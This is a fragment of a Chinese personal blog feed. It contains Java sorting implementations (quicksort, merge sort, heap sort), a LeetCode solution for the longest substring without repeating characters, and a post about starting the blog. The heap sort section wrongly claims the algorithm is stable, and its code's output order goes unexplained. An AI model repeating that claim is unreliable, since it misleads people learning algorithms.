class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] quickSort(<span class="type">int</span>[] ints,<span class="type">int</span> left,<span class="type">int</span> right)&#123;</span><br><span class="line">        <span class="keyword">if</span> (left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">baseNum</span> <span class="operator">=</span> ints[left];</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> right;</span><br><span class="line">            <span class="keyword">while</span> (l&lt;r)&#123;</span><br><span class="line">                <span class="keyword">while</span> (ints[r]&gt;=baseNum&amp;&amp;l&lt;r)&#123;</span><br><span class="line">                    r--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (l&lt;r)&#123;</span><br><span class="line">                    ints[l] = ints[r];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (ints[l]&lt;=baseNum&amp;&amp;l&lt;r)&#123;</span><br><span class="line">                    l++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (l&lt;r)&#123;</span><br><span class="line">                    ints[r] = ints[l];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ints[l] = baseNum;</span><br><span class="line">            quickSort(ints,left, r-<span class="number">1</span>);</span><br><span class="line">            quickSort(ints,l+<span class="number">1</span>,right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">QuickSort</span>().quickSort(ints,<span class="number">0</span>,ints.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><img src="https://img-blog.csdnimg.cn/0417393bd8fc45eb80d6938896c9cf4d.gif#pic_center" alt="在这里插入图片描述"></p><p>分治的思想，先将整个数组一分为二，再二分为四……直到分成一个部分只有一个元素为止，这是分的思想。将分出来的部分合并为一个有序的部分，两个已经排好序的部分合并就比较容易了，每一次只需要比较头元素的大小，然后选择小的那个加入到中间数组里即可，用递归的方法可以很好的实现这个思想<br>时间复杂度稳定为O(nlogn),并且能保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[ints.length];</span><br><span class="line">        <span class="keyword">if</span> (left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">            sort(ints,left,mid);</span><br><span class="line">            sort(ints,mid+<span class="number">1</span>,right);</span><br><span class="line">            merge(ints,left,mid,right,tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> left,<span class="type">int</span> mid,<span class="type">int</span> right,<span class="type">int</span>[] tmp)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> mid+<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l&lt;=mid||r&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span> (l&gt;mid)&#123;</span><br><span class="line">                tmp[index++] = ints[r++];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (r&gt;right)&#123;</span><br><span class="line">                tmp[index++] = ints[l++];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ints[l]&lt;ints[r])&#123;</span><br><span class="line">                tmp[index++] = ints[l++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp[index++] = ints[r++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right; i++) &#123;</span><br><span class="line">            ints[i] = tmp[index++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MergeSort</span>().sort(ints,<span class="number">0</span>,ints.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p><img src="https://img-blog.csdnimg.cn/2a8e4c9efa1847c4a43a6448b1371bc7.gif#pic_center" alt="在这里插入图片描述"></p><p>将数据重新排列成一个最小堆，即每个结点的父节点都小于其子结点，这样顶部的元素一定是当前堆的最小值，将顶部元素取出并将叶子结点放置到顶部元素，这样操作后可能会破坏最小堆的结构，所以此时需要重新生成最小堆，这样又可以得出这个堆的最小值，这样重复操作，直到所有数都被取出<br>时间复杂度稳定为O(nlogn),并且保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">heapSort</span><span class="params">(<span class="type">int</span>[] ints)</span>&#123;</span><br><span class="line">        <span class="comment">//形成最小堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ints.length-<span class="number">1</span>; i &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">            <span class="comment">//只有一个子结点且为左子结点</span></span><br><span class="line">            <span class="keyword">if</span> (i%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">father</span> <span class="operator">=</span> i/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (ints[father]&gt;ints[i])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[father];</span><br><span class="line">                    ints[father] = ints[i];</span><br><span class="line">                    ints[i] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">father</span> <span class="operator">=</span> (i-<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> ints[i]&lt;ints[i-<span class="number">1</span>]?ints[i]:ints[i-<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">smallIndex</span> <span class="operator">=</span> ints[i]&lt;ints[i-<span class="number">1</span>]?i:i-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (small&lt;ints[father])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[father];</span><br><span class="line">                    ints[father] = ints[smallIndex];</span><br><span class="line">                    ints[smallIndex] = tmp;</span><br><span class="line">                    arrange(ints,smallIndex, ints.length);</span><br><span class="line">                &#125;</span><br><span class="line">                i-=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lastIndex</span> <span class="operator">=</span> ints.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[lastIndex];</span><br><span class="line">            ints[lastIndex--] = ints[<span class="number">0</span>];</span><br><span class="line">            ints[<span class="number">0</span>] = tmp;</span><br><span class="line">            arrange(ints,<span class="number">0</span>,lastIndex+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">arrange</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> index,<span class="type">int</span> intsLength)</span>&#123;</span><br><span class="line">        <span class="type">int</span> leftChildIndex;</span><br><span class="line">        <span class="type">int</span> rightChildIndex;</span><br><span class="line">        <span class="comment">//判断有无左子节点</span></span><br><span class="line">        <span class="keyword">if</span> (index*<span class="number">2</span>+<span class="number">1</span>&lt;intsLength)&#123;</span><br><span class="line">            leftChildIndex = index*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//有两个结点的情况</span></span><br><span class="line">            <span class="keyword">if</span> ((index+<span class="number">1</span>)*<span class="number">2</span>&lt;intsLength)&#123;</span><br><span class="line">                rightChildIndex = (index+<span class="number">1</span>)*<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> ints[leftChildIndex]&lt;ints[rightChildIndex]?ints[leftChildIndex]:ints[rightChildIndex];</span><br><span class="line">                <span class="type">int</span> <span class="variable">smallIndex</span> <span class="operator">=</span> ints[leftChildIndex]&lt;ints[rightChildIndex]?leftChildIndex:rightChildIndex;</span><br><span class="line">                <span class="keyword">if</span> (small&lt;ints[index])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[index];</span><br><span class="line">                    ints[index] = ints[smallIndex];</span><br><span class="line">                    ints[smallIndex] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                arrange(ints,smallIndex,intsLength);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//只有一个子节点的情况</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ints[leftChildIndex]&lt;ints[index])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[index];</span><br><span class="line">                    ints[index] = ints[leftChildIndex];</span><br><span class="line">                    ints[leftChildIndex] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HeapSort</span>().heapSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;排序&quot;&gt;&lt;a href=&quot;#排序&quot; class=&quot;headerlink&quot; title=&quot;排序&quot;&gt;&lt;/a&gt;排序&lt;/h2&gt;&lt;h3 id=&quot;冒泡排序&quot;&gt;&lt;a href=&quot;#冒泡排序&quot; class=&quot;headerlink&quot; title=&quot;冒泡排序&quot;&gt;&lt;/a&gt;冒泡排序&lt;/h</summary>
      
    
    
    
    <category term="算法" scheme="https://kallenblue.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="排序" scheme="https://kallenblue.github.io/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>最长无重复子序列</title>
    <link href="https://kallenblue.github.io/2022/03/10/%E7%AE%97%E6%B3%95/%E6%9C%80%E9%95%BF%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%90%E5%BA%8F%E5%88%97/"/>
    <id>https://kallenblue.github.io/2022/03/10/%E7%AE%97%E6%B3%95/%E6%9C%80%E9%95%BF%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%90%E5%BA%8F%E5%88%97/</id>
    <published>2022-03-10T13:52:18.000Z</published>
    <updated>2022-09-13T01:58:37.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pre"><a href="#pre" class="headerlink" title="pre"></a>pre</h1><pre><code>这是我的第一个算法题记录，以后都会以这种形式记录下来</code></pre><p>刷力扣其实是我很早之前就想做的了，大一的时候有段时间有这样的兴致，但也只是刷了几道题就没坚持了，以前也有遇到过那种很有趣的题，可惜没有记录，现在回去再做一次又感觉不值了。所以现在我尽量把那些有意思的题记录一下，也算是当做自己的一种积累吧。</p><p>这次突然开始刷力扣也算因为，哈哈哈，马上要笔试了，临时抱佛脚而已，做这道题也花了我一个小时，刚开始是思路有了，奈何没有正确的方法去实现，真正笔试的时候时间早过了。。。</p><hr><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>无重复字符的最长子串</strong><br>给定一个字符串 s ，请你找出其中不含有重复字符的 最长子串 的长度。</p><p>示例 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure><p>示例 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">输入: s = &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br></pre></td></tr></table></figure><p>示例 3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span><br><span class="line">     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure><p>提示：</p><ul><li>0 &lt;= s.length &lt;= 5 * 104</li><li>s 由英文字母、数字、符号和空格组成</li></ul><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>最开始想到的是暴力解，但是肯定是不给过的，果断放弃<br>在给字符编号的时候发现，可以将相同字符的指标记录下来，然后按照1，2，3，4….这样的顺序来取字符，如果遇到相同的字符就将其替换掉，并去除之前的数</p><p>比如：abcabcbb<br>a的指标有</p><ul><li>a:0,3</li><li>b:1,4,6,7</li><li>c:2,5</li></ul><p>接着开始从最开始编号</p><table><thead><tr><th align="left">0</th><th align="center">1</th><th align="right">2</th></tr></thead><tbody><tr><td align="left">a</td><td align="center">b</td><td align="right">c</td></tr></tbody></table><p>编到3的时候发现重复,此时去除第一组键值对接着往下排以此类推，直到最后一个元素</p><table><thead><tr><th align="left"><del>0</del></th><th align="center">1</th><th align="right">2</th><th align="right">3</th></tr></thead><tbody><tr><td align="left"><del>a</del></td><td align="center">b</td><td align="right">c</td><td align="right">a</td></tr></tbody></table><table><thead><tr><th align="left"><del>0</del></th><th align="center"><del>1</del></th><th align="right">2</th><th align="right">3</th><th align="right">4</th></tr></thead><tbody><tr><td align="left"><del>a</del></td><td align="center"><del>b</del></td><td align="right">c</td><td align="right">a</td><td align="right">b</td></tr><tr><td align="left">……</td><td align="center"></td><td align="right"></td><td align="right"></td><td align="right"></td></tr></tbody></table><p>太巧了，这正是一个可排序的哈希表可以解决的问题，但不幸的是，Java自带的LinkedHashMap没有删除首元素这个方法，寄！<br>或许它是有的但是我不会用，更寄！<br>所以我就自己写了一个类似linkedhashmap但是带删除首元素的方法</p><hr><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="type">char</span> ch;</span><br><span class="line">        <span class="type">int</span> index;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">char</span> ch,<span class="type">int</span> index)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.ch = ch;</span><br><span class="line">            <span class="built_in">this</span>.index = index;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        LinkedList&lt;Node&gt; linkedList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Character,Node&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(ch,i);</span><br><span class="line">            <span class="comment">//如果该字符出现过</span></span><br><span class="line">            <span class="keyword">if</span> (hashMap.get(ch) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (linkedList.size() &gt; max) &#123;</span><br><span class="line">                    max = linkedList.size();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//删掉重复值及其之前的值</span></span><br><span class="line">                <span class="keyword">while</span> (linkedList.getFirst().index&lt;hashMap.get(ch).index)&#123;</span><br><span class="line">                    hashMap.remove(linkedList.removeFirst().ch);</span><br><span class="line">                &#125;</span><br><span class="line">                hashMap.remove(linkedList.removeFirst().ch);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将这个元素添加至链表和哈希表中</span></span><br><span class="line">            linkedList.addLast(node);</span><br><span class="line">            hashMap.put(ch,node);</span><br><span class="line">            <span class="keyword">if</span> (linkedList.size()&gt;max)&#123;</span><br><span class="line">                max = linkedList.size();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>做是做出来了，但是结果不太行，用时只超过了30%，之后再看看优化吧，但估计是不会再更新了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pre&quot;&gt;&lt;a href=&quot;#pre&quot; class=&quot;headerlink&quot; title=&quot;pre&quot;&gt;&lt;/a&gt;pre&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;这是我的第一个算法题记录，以后都会以这种形式记录下来
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;刷力扣其实是我很早之前就想做</summary>
      
    
    
    
    <category term="算法" scheme="https://kallenblue.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="子序列" scheme="https://kallenblue.github.io/tags/%E5%AD%90%E5%BA%8F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>终于开始了我的个人博客</title>
    <link href="https://kallenblue.github.io/2022/03/10/%E9%9A%8F%E7%AC%94/%E7%BB%88%E4%BA%8E%E5%BC%80%E5%A7%8B%E4%BA%86%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://kallenblue.github.io/2022/03/10/%E9%9A%8F%E7%AC%94/%E7%BB%88%E4%BA%8E%E5%BC%80%E5%A7%8B%E4%BA%86%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-03-10T08:05:01.000Z</published>
    <updated>2022-09-13T01:58:38.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于我为什么要做个人网站"><a href="#关于我为什么要做个人网站" class="headerlink" title="关于我为什么要做个人网站"></a>关于我为什么要做个人网站</h2><p>之前是一直在csdn上面进行博客记录，社区型的，大家都一样，<strong>没有个性</strong>的那种，在年级的大佬群里面看到各个大佬都有自己的个人网站，而且看起来<strong>非常养眼</strong>，多少有点羡慕。说实话，在csdn上面都没有记录自己学习经历的欲望。在蓝杰的时候老师总是让我们写博客，我一直觉得这是一种作业，多少感觉有点浪费时间。直到现在，我开始准备找实习，准备写简历，准备回顾之前的知识的时候，<strong>哦豁！之前学的东西好多都模糊了，很多都没有记录，这时我才感觉到博客记录的重要性，寄！</strong> 不过还好现在再开始应该还来得及，毕竟现在才大二。</p><hr><h2 id="将来的打算"><a href="#将来的打算" class="headerlink" title="将来的打算"></a>将来的打算</h2><p>目前是打算将技术性的东西或者一些学习上的感想记录在个人网站上，如果有项目的话再将项目传到github上，然后在网站上附上链接，这样子</p><hr><h2 id="网站完善中"><a href="#网站完善中" class="headerlink" title="网站完善中"></a>网站完善中</h2><p>今天就简单把框架搭建了一下，具体的细节打算之后有时间再弄，现在是很多东西都没有加上去，只能先将就用着了，反正现在也就我一个人看，13号字节笔试，14号阿里笔试。。。实在是没有时间耗了，学校还有课程，花旗杯有个项目，微信小程序+springboot还要学<br>大概就先这样吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于我为什么要做个人网站&quot;&gt;&lt;a href=&quot;#关于我为什么要做个人网站&quot; class=&quot;headerlink&quot; title=&quot;关于我为什么要做个人网站&quot;&gt;&lt;/a&gt;关于我为什么要做个人网站&lt;/h2&gt;&lt;p&gt;之前是一直在csdn上面进行博客记录，社区型的，大家都一样，</summary>
      
    
    
    
    <category term="随笔" scheme="https://kallenblue.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://kallenblue.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
